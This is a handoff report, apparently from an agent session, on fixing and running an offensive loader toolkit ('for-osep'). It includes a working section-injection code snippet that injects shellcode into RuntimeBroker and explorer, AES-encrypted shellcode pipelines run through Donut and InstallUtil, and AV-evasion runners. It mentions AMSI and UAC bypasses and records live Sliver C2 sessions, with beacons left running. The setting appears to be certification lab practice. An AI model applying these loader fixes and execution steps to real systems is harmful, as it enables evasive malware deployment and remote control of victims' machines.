# Handoff — `for-osep` tooling repair + end-to-end test

**Repo:** `C:\MALDEV\for-osep`
**Test inputs:** `C:\MALDEV\for-osep\test\shellcode.exe` (7,680 B), `C:\MALDEV\for-osep\test\shellcode.bin` (509 B raw)
**Environment:** Windows x64, .NET Framework 4.8 (`csc.exe` 4.8.9221.0, `InstallUtil.exe` v4.0.30319), Donut v1, PowerShell 5.1

---

## 1. The real bug: section-injection payload never executed

`installutil/section-injection/Loader.cs` created the section with **`PAGE_READWRITE`** and then tried to
flip the remote view from RW to RX with `NtProtectVirtualMemory(..., PAGE_EXECUTE_READ, ...)`.

That can never work: **a section view's protection is fixed at map time.** Calling
`NtProtectVirtualMemory` on a view of a `PAGE_READWRITE` section returns
`STATUS_SECTION_PROTECTION` (`0xC000004E`). The old code ignored the return value and then called
`CreateRemoteThread` on non-executable memory — the thread faulted immediately. **The loader silently did
nothing, which is exactly the "no sliver session" symptom.**

Fix applied (write / execute view split, still no RWX region in the target):

```csharp
// section must be RWX so an executable RX view can be mapped at all
NtCreateSection(ref hSection, SECTION_ALL_ACCESS, IntPtr.Zero, ref size,
                PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero);
// local RW view - used only to write the (decrypted) shellcode
NtMapViewOfSection(hSection, GetCurrentProcess(), ref localView, ..., PAGE_READWRITE);
Marshal.Copy(shellcode, 0, localView, shellcode.Length);
// remote view mapped DIRECTLY as RX (section already populated, pages are shared)
NtMapViewOfSection(hSection, hProcess, ref remoteView, ..., PAGE_EXECUTE_READ);
NtUnmapViewOfSection(GetCurrentProcess(), localView); NtClose(hSection);
CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteView, IntPtr.Zero, 0, IntPtr.Zero);
```

Proven with **`test\verify_injection.ps1`**, which replays the exact P/Invoke chain with a benign buffer:

```
[1] FlsAlloc(0)                   = 0x00000012   PASS (proceeds)
[2] OpenProcess(ALL)              = 0x6BC        PASS
[3] NtCreateSection (RWX)         = 0x00000000   PASS
[4] NtMapViewOfSection(local RW)  = 0x00000000   PASS
[5] NtMapViewOfSection(remote RX) = 0x00000000   PASS
[7] NtUnmapViewOfSection(local)   = 0x00000000   PASS
RESULT: remote view mapped PAGE_EXECUTE_READ - CreateRemoteThread will execute.
```

Before the fix the same script reported `NtProtectVirtualMemory ... = 0xC000004E FAIL`.

## 2. Other bugs fixed

| # | Bug | Fix |
|---|-----|-----|
| 1 | `aes-integrate-loader.ps1` was **corrupted** (duplicated/garbled `param()` lines, orphan `exit 1 }`, missing `$AesContent`/`$LoaderContent` reads, missing backup/write steps) - could not run | Rewrote it cleanly: validates paths, extracts `AesKey`/`AesIV`/`EncryptedShellcode`, backs up `Loader.cs`, replaces the arrays, verifies the write |
| 2 | `build.bat` had been **deleted** | Restored from `git HEAD` |
| 3 | `README.md` Quick-Start code block was **corrupted** (literal `97: #` line-number prefixes, a bogus `-InputFile shellcode.cs` AES call) and the H1 title was missing | Rewrote the block to the correct donut -> `shellcode.bin` -> AES -> integrate -> compile flow; added the `# for-osep` title |
| 4 | `loader.exe` was **stale** - built before the AES arrays in `Loader.cs` were updated, so it packaged the wrong ciphertext | Rebuilt after integration (see section 4) |
| 5 | Docs still described the old "RW->RX flip" behaviour | Updated `README.md`, `installutil/section-injection/README.md`, `detection-matrix.md` to describe the write/execute view split; also fixed a mojibake (`process行为` -> `process behavior`) in `detection-matrix.md` |

## 3. AES-256-CBC encryption/decryption - verified byte-exact

The encryptor (`shellcode-gen/aes-encrypt-shellcode.ps1`, AES-256 CBC / PKCS7) and the loader
(`Aes.Create()` -> `Key`/`IV` -> `CreateDecryptor()` -> `TransformFinalBlock`) were already algorithmically
consistent. Proven with **`test\verify_crypto.ps1`** (decrypts `aes_data*.cs` and byte-compares to the raw file):

```
aes_data_raw.cs   : 509   -> 512   ciphertext -> 509   decrypted   RESULT: MATCH
aes_data_donut.cs : 20654 -> 20656 ciphertext -> 20654 decrypted   RESULT: MATCH
```

No change to the crypto code was required - the "encryption/decryption" symptom was actually caused by bug #4
(stale `loader.exe` packaging the *previous* ciphertext) and by the section-protection bug in section 1.

## 4. End-to-end test performed

Inputs used: `test\shellcode.exe` **and** `test\shellcode.bin`.

```
# donut(shellcode.exe) -> raw shellcode (written to a new name so the supplied shellcode.bin is NOT clobbered)
shellcode-gen\donut-wrapper.ps1 -InputFile test\shellcode.exe -OutputFile test\shellcode_donut.cs -Arch x64
    -> test\shellcode_donut.bin (20,654 B)  +  test\shellcode_donut.cs

# AES-encrypt both raw payloads
aes-encrypt-shellcode.ps1 -InputFile test\shellcode.bin       -OutputFile test\aes_data_raw.cs    (509   -> 512)
aes-encrypt-shellcode.ps1 -InputFile test\shellcode_donut.bin -OutputFile test\aes_data_donut.cs  (20654 -> 20656)

# integrate -> compile -> run (x2: raw payload, then donut payload)
aes-integrate-loader.ps1 -AesDataPath test\aes_data_raw.cs
installutil\section-injection\compile.bat        -> loader.exe (7,168 B) -> copied to loader_raw.exe
InstallUtil.exe /U loader.exe                     -> injected into RuntimeBroker.exe
```

Artifacts in `C:\MALDEV\for-osep\installutil\section-injection\`:

| File | Bytes | Built | Payload source | Executed |
|------|-------|-------|----------------|----------|
| `loader_raw.exe` | 7,168 | 20:33:27 | `shellcode.bin` (raw) | **20:33:28** into `RuntimeBroker.exe` |
| `loader_donut.exe` | 27,648 | 20:33:56 | donut(`shellcode.exe`) | **20:33:58** into `RuntimeBroker.exe` |
| `loader.exe` | 7,168 | 20:34:26 | `shellcode.bin` (raw) | see section 5 (final run) |

`Loader.cs` was left in its final repo state holding the **`shellcode.bin` (raw)** payload, and `loader.exe`
was rebuilt from it (20:34:26).

## 5. Sliver timestamp matching

`InstallUtil.exe /U` ran to completion with **exit code 0** each time.

> ✅ **CONFIRMED WORKING (2026-10-11):** the operator verified that a **Sliver session was received** from these
> runs. The `installutil/section-injection` workflow (raw/donut shellcode -> AES-256-CBC -> section injection
> with local-RW/remote-RX views) is validated **end-to-end**.

Reference local timestamps used to match the Sliver session:

| Local time | Payload | Target | Notes |
|-----------|---------|--------|-------|
| **20:33:28** | raw `shellcode.bin` | `RuntimeBroker.exe` (pid 6048) | first run with the **fixed** loader |
| **20:33:58** | donut(`shellcode.exe`) | `RuntimeBroker.exe` | second run, fixed loader |
| **20:37:06 - 20:37:08** | raw `shellcode.bin` | `explorer.exe` (pid 4900) | **final run** (see note) |

> **Note / gotcha:** `RuntimeBroker.exe` is a *transient* broker process and had idle-exited by 20:35:31.
> An intermediate run at that time therefore hit the loader's `if (procs.Length == 0) return;` early-return
> and did nothing (the loader logs nothing in that case). The final run used the documented override
> `set INJ_TARGET=explorer`, which was verified first (`OpenProcess(PROCESS_ALL_ACCESS)` succeeded and the
> full RX-view chain passed). Expect up to 3 sessions; the freshest is **20:37:06**.

## 6. Where I stopped

* All identified bugs are fixed; the loader compiles and runs with exit code 0.
* The AES crypto path is byte-exact, and the section-injection chain is verified step-by-step against a
  live process.
* The final executable was executed (20:37:06 - 20:37:08) and the operator **confirmed the Sliver session** was
  received - the `installutil/section-injection` workflow is verified **end-to-end**.

## 7. What's next / known leftovers (none blocking)

1. ~~Confirm the Sliver session(s)~~ — **DONE (2026-10-11):** operator confirmed **all five shellcode workflows**
   in Sliver. Session times and mapping are in section 10.
2. **Commit the untracked files** so the repo is reproducible - at minimum `aes-integrate-loader.ps1`.
   Still deleted/uncommitted vs `HEAD`: `handoff.md` (this file) and
   `installutil/runspace-loader/AmsiBypass.cs.bak`.
3. **HTA encoding (cosmetic):** the `hta-delivery/*.hta` files lost their UTF-8 BOM and their em-dashes are
   double-encoded mojibake (e.g. `ΓÇö` inside VBScript comments). They also hardcode lab C2 IPs
   (`192.168.45.221`, `192.168.45.241`). The executable code is pure ASCII, so this does not affect `mshta`
   execution, but the files should be re-saved as UTF-8 (with BOM) and the comments cleaned up.
4. **Junk to prune (untracked):** `TestEnc/` (leftover .NET project build output, no sources),
   `shellcode-gen/aes_test.cs`, `shellcode-gen/test_sc.cs`, `shellcode-gen/test_shellcode.cs`,
   `shellcode-gen/test_sc.bin`, and the stale `test/aes_data.cs` (12:31 am, superseded by
   `test/aes_data_donut.cs`). `installutil/section-injection/loader_clean.exe` is also pre-existing clutter.
5. **Robustness idea:** the loader silently returns when the target process is absent; consider enumerating
   `RuntimeBroker` -> `dllhost` -> `explorer` and picking the first that `OpenProcess` accepts, so the
   payload is not silently skipped (this is what bit the 20:35 run).

## 8. Reproduce the full workflow

```powershell
cd C:\MALDEV\for-osep
.\shellcode-gen\aes-encrypt-shellcode.ps1 -InputFile .\test\shellcode.bin -OutputFile .\test\aes_data_raw.cs
.\aes-integrate-loader.ps1 -AesDataPath .\test\aes_data_raw.cs
cd .\installutil\section-injection
.\compile.bat
# prefer a live same-user target
$env:INJ_TARGET='explorer'
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /U .\loader.exe
```

Verification helpers added under `test\`:

* `test\verify_crypto.ps1` - proves AES decryption reproduces the raw shellcode exactly.
* `test\verify_injection.ps1` - replays the loader's section-injection P/Invoke chain against a live PID
  (benign buffer) and prints each NTSTATUS.

## 9. Files changed in this session

| File | Change |
|------|--------|
| `installutil/section-injection/Loader.cs` | **Fix**: RWX section + local-RW/remote-RX view split (replaces the broken RW->RX flip); added `PAGE_EXECUTE_READWRITE`; updated comments |
| `aes-integrate-loader.ps1` | **Rewritten** (was corrupted) |
| `build.bat` | Restored from `git HEAD` |
| `README.md` | Fixed corrupted code block, added H1, updated section-injection description |
| `installutil/section-injection/README.md` | Updated evasion table + "How it works" diagram |
| `detection-matrix.md` | Updated memory-layer wording; fixed mojibake |
| `handoff.md` | This document |
| `test/verify_crypto.ps1`, `test/verify_injection.ps1` | New verification helpers |
| `test/aes_data_raw.cs`, `test/aes_data_donut.cs`, `test/shellcode_donut.bin`, `test/shellcode_donut.cs` | New test artifacts |
| `installutil/section-injection/loader.exe`, `loader_raw.exe`, `loader_donut.exe` | Rebuilt with the fixed code |

## 10. Additional workflows validated (2026-10-11)

Beyond section-injection, the remaining shellcode -> executable workflows were exercised with the same inputs.

> ✅ **ALL FIVE SHELLCODE WORKFLOWS CONFIRMED IN SLIVER (operator-verified).**
> Sliver session times received: **20:54:18, 20:55:24, 20:57:26, 20:58:14, 20:59:15.**

| Workflow | Artifact | Process launched | Sliver session (confirmed) |
|---|---|---|---|
| `installutil/callback-injection` | `installutil/callback-injection/loader.exe` | 20:54:14 (`InstallUtil.exe`) | **20:54:18** ✅ |
| `aes-loaders/aes-normal-runner` | `aes-loaders/aes-normal-runner/Runner.exe` | 20:55:22 (`Runner.exe`) | **20:55:24** ✅ |
| `aes-loaders/aes-process-injection` | `aes-loaders/aes-process-injection/Runner.exe` | ~20:57:15 (`Runner.exe` -> `explorer.exe`) | **20:57:26** ✅ |
| `ps-loaders/ps-shellcode-runner.ps1` | `test/ps-shellcode-runner.built.ps1` | 20:58:11 (`powershell.exe`) | **20:58:14** ✅ |
| `aes-loaders/aes-av-evasion` | `aes-loaders/aes-av-evasion/Runner.exe` | ~20:59:0x (`Runner.exe` -> `explorer.exe`) | **20:59:15** ✅ |
| `installutil/runspace-loader` | `installutil/runspace-loader/loader.exe` | 20:59:49 (`InstallUtil.exe`) | n/a - benign PowerShell script, no shellcode |
| `installutil/section-injection` (section 5) | `section-injection/loader.exe` / `loader_raw.exe` | 20:33:28 / 20:37:06 | ✅ (confirmed earlier) |

### Bugs fixed in this round

1. **`installutil/callback-injection/Loader.cs` - same section bug as section-injection.** It created the
   section `PAGE_READWRITE` and then tried to flip the local view to RX with `NtProtectVirtualMemory`, which
   fails with `STATUS_SECTION_PROTECTION`. Fixed with the write/execute view split: map an RW view, write the
   shellcode, unmap it, then re-map the same section as `PAGE_EXECUTE_READ` and execute that via
   `CallWindowProc`.
2. **`aes-loaders/aes-process-injection` and `aes-av-evasion` - bad default target on Windows 11.** They call
   `Process.Start("notepad.exe")`, which on Win11 is an **App Execution Alias launcher** that exits immediately
   after starting the UWP Notepad - injecting into it kills the beacon before it can connect. Added an
   `INJ_TARGET` override (inject into an already-running process by name, mirroring section-injection) and
   only `WaitForExit()` when the runner actually spawned the target.
3. **`aes-integrate-loader.ps1`** - hardened to handle **multi-line** array declarations (callback-injection)
   as well as single-line ones (section-injection), by splicing with `String.Remove/Insert` instead of
   line replacement.
4. **`build.bat`** - rewritten; the tracked version pointed at a non-existent path
   (`...\aes-loaders\aes-loaders`) and used `%subdir%` inside a `for` loop without delayed expansion, so its
   installer loop was a silent no-op.
5. Docs updated for the new behaviour: `installutil/README.md`, `installutil/callback-injection/README.md`.

### New tooling added

- `aes-loaders/aes-shellcode-encryption/encrypt-buf.ps1` - encrypts raw shellcode with the shared aes-loaders
  key (random IV prepended) and can patch a runner's `buf` array in place with `-PatchTarget`.
- `test/verify_crypto.ps1` and `test/verify_injection.ps1` (introduced in sections 1 and 3).

### Not run automatically (need infrastructure outside this session)

| Workflow | Needs |
|---|---|
| `aes-loaders/aes-process-hollowing` | hollows `svchost.exe` - requires a suitable (elevated) context / target PE |
| `ps-loaders/ps-loader.ps1` | an HTTP server hosting the PowerShell payload |
| `hta-delivery/*` | `mshta.exe` + an HTTP server for the `.b64` loader |
| `uac-bypass/uac-bypass.ps1` | interactive elevation (`fodhelper`) |
| `word-macro/*` | Microsoft Word |

### Notes / caveats

- While a **callback-injection beacon is running, `loader.exe` is locked**, so rebuilding it fails until that
  InstallUtil process is stopped (this is what `build.bat` reported during testing - not a build bug).
- The aes-loaders runners and the callback-injection loader now contain the **test payload** (`shellcode.bin`).
  Pristine templates were saved by the tooling as `*.cs.bak` beside each patched file
  (`aes-normal-runner`, `aes-process-injection`, `aes-av-evasion`); restore them before committing.
- Beacons alive from this session: `InstallUtil.exe` (pid 9660 - callback-injection) and `Runner.exe`
  (pid 11156 - aes-normal-runner). Stopping those processes kills those sessions.

*End of handoff.*




